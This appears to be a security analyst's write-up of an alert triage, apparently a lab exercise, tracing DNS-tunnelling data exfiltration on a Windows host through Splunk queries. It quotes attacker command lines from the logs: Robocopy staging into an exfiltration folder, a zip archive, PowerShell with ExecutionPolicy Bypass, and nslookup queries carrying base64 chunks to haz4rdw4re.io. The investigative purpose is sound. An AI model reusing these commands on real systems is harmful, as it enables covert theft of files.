# Suspicious-Parent-Child-Relationship
A suspicious process with an uncommon parent-child relationship was detected.

**ALERTS** <br>
* datasource: sysmon <br>
* timestamp: 03/11/2026 08:48:20.881 <br>
* event.code: 1 <br>
* host.name: win-3450 <br>
* process.name: nslookup.exe <br>
* process.pid: 3648 <br>
* process.parent.pid: 3728 <br>
* process.parent.name: powershell.exe <br>
* process.command_line: "C:\Windows\system32\nslookup.exe" RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io <br>
* process.working_directory: C:\Users\michael.ascot\downloads\ <br>
* event.action: Process Create (rule: ProcessCreate)


**STEP-1: CONFIRM IF THE LOG EXIST IN SPLUNK. RUN:** <br>
index=* host.name="win-3450" process.pid=3648 event.code=1

  <img width="960" height="376" alt="image" src="https://github.com/user-attachments/assets/7eb9f9c6-e652-48e1-9c5d-88bfdd62e719" />

From the spl query and the image above, i discoveed that the log exist and also discovered the event below: <br>
**Field	                           Value** <br>
* Host	                           win-3450 <br>
* Process	                         nslookup.exe <br>
* Parent	                         powershell.exe <br>
* PID	                             3648 <br>
* Parent PID	                     3728 <br>
* User Directory	                 C:\Users\michael.ascot\downloads\ <br>
* Domain Queried	                 RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io

**Key suspicion**
* PowerShell spawning nslookup
* Encoded DNS query
* Execution from Downloads folder

 **Step-2 I Investigated the Parent Process (PowerShell)** <br>
It's important to see what PowerShell executed. I ran: <br>
index=* host.name="win-3450" process.pid=3728 

<img width="960" height="415" alt="image" src="https://github.com/user-attachments/assets/3902ffd3-dc64-444f-bdc5-d72c726c15ae" /> <br>
<img width="960" height="202" alt="image" src="https://github.com/user-attachments/assets/aa654f65-3e88-4288-955a-6010ea673cf4" />

**Timeline of Activity (Very Important)** <br>
From the results/screenshot above, i can  reconstruct the attack timeline.

**Time	    Event**
* 08:44:25	PowerShell created a temporary script <br>
* 08:45:59	PowerShell created a folder exfiltration <br>
* 08:47:22	PowerShell created exfilt8me.zip <br>
* 08:48:07	nslookup.exe queried encoded domain

This sequence strongly suggests data staging + data exfiltration.

**Steps-3 What Files Were Collected?** <br>
I Tried to see what files were accessed or copied. I ran: <br>
index=* host.name="win-3450" "exfiltration"

<img width="960" height="210" alt="image" src="https://github.com/user-attachments/assets/4e3e0f08-93d4-4c79-9e20-ab4da78967e4" />

**Create Exfiltration Folder** <br>
* Time: 08:45:59. C:\Users\michael.ascot\Downloads\exfiltration <br>
* Created by: powershell.exe <br>
* Purpose: Attacker prepares a folder to stage stolen files.

**Sensitive Files Were Collected** <br>
<img width="960" height="235" alt="image" src="https://github.com/user-attachments/assets/9c8c4946-5d25-44a9-9fe5-2e7470d24727" />

**Time: 08:46:53**

PowerShell launches:
Robocopy.exe

Command: <br>
Robocopy.exe . C:\Users\michael.ascot\downloads\exfiltration /E

This copies files into the exfiltration folder.

<img width="960" height="395" alt="image" src="https://github.com/user-attachments/assets/f0c9d44a-1cdd-4346-84fc-e8757202c96e" />

**Files copied:**
ClientPortfolioSummary.xlsx <br>
InvestorPresentation2023.pptx

These appear to be sensitive business documents.

**Files Were Compressed**
<img width="960" height="210" alt="image" src="https://github.com/user-attachments/assets/a6cd2998-cf05-4346-8243-a69e5bc7c70a" />

**Time: 08:47:22**

PowerShell creates: <br>
exfilt8me.zip

Location: <br>
C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip

Purpose: <br>
Attackers compress files before sending them out.

**Data Exfiltration via DNS**

Then the attacker executes: <br>
nslookup $_.haz4rdw4re.io

So each chunk becomes a DNS query like: <br>
UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io

This sends the data to the attacker domain: <br>
haz4rdw4re.io

**My logs clearly show many of these:** <br>
nslookup U3VtbWFyeS54bHN4c87JTM0rCcgvKk.haz4rdw4re.io
nslookup 8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv.haz4rdw4re.io
nslookup dGF0aW9uMjAyMy5wcHR488wrSy0uyS.haz4rdw4re.io

<img width="961" height="203" alt="image" src="https://github.com/user-attachments/assets/feb5b5ec-95a8-4663-b3fa-babb8901afd9" /> <br>
<img width="960" height="193" alt="image" src="https://github.com/user-attachments/assets/416d104b-bd34-4640-8813-cc4497d94c88" /> <br>
<img width="960" height="182" alt="image" src="https://github.com/user-attachments/assets/4b5fd4be-c1b5-495c-84f4-814b15d8552a" /> <br>
<img width="960" height="197" alt="image" src="https://github.com/user-attachments/assets/5d6d9f5d-7afd-45bb-bdfa-c0aadf0021ce" />


**step 8: Evidence of Data Exfiltration** <br>
The  logs explicitly show:

**Stolen files** <br>
ClientPortfolioSummary.xlsx <br>
InvestorPresentation2023.pptx

**Exfiltration archive** <br>
exfilt8me.zip

**Exfiltration method**
nslookup <base64>.haz4rdw4re.io

**Execution method**
PowerShell -ExecutionPolicy Bypass

**Step 9 Indicators of Compromise (IOCs)** <br>
* Host: win-3450 <br>
* User: SSF\michael.ascot
* Malicious domain: haz4rdw4re.io
* Tools used: <br>
PowerShell <br>
Robocopy <br>
nslookup <br>
* Files targeted:
ClientPortfolioSummary.xlsx <br
InvestorPresentation2023.pptx

* Archive created: <br>
exfilt8me.zip

**Step 10 Recommended SOC Actions** <br>
 * Immediately isolate the host <br>
win-3450.

* Block the attacker domain <br>
haz4rdw4re.io

* Block on: <br>
DNS <br>
Proxy <br>
Firewall

* Reset compromised user account<br>
michael.ascot

* Search for same activity in environment. Search in Splunk: <br>
index=* "haz4rdw4re.io"

* Run full EDR malware scan <br>
Look for: <br>
persistence <br>
scheduled tasks <br>
malware droppers

**step 11 Reason for Classifying as True Positive** <br>
Logs show a PowerShell script executing with ExecutionPolicy Bypass which:

* Created an exfiltration directory <br>
* Used Robocopy to copy sensitive files <br>
* Compressed files into exfilt8me.zip <br>
* Encoded the ZIP file into Base64 <br>
* Split encoded data into chunks <br>
* Sent data externally using nslookup DNS queries to haz4rdw4re.io <br>
This behavior matches DNS data exfiltration techniques used by attackers.

**step 12 Reason for Escalating the Alert** <br>
Sensitive corporate documents were staged and exfiltrated using covert DNS tunneling. <br>
This represents:

* confirmed data theft <br>
* potential data breach <br>
* active malicious PowerShell execution

**step 13 Recommended Remediation Actions** <br>
* Isolate affected host <br>
* Block malicious domain <br>
*Reset compromised user account <br>
* Conduct full endpoint forensic investigation <br>
* Search environment for similar activity <br>
* Review data access logs for potential exposure

  Severity Level: HIGH

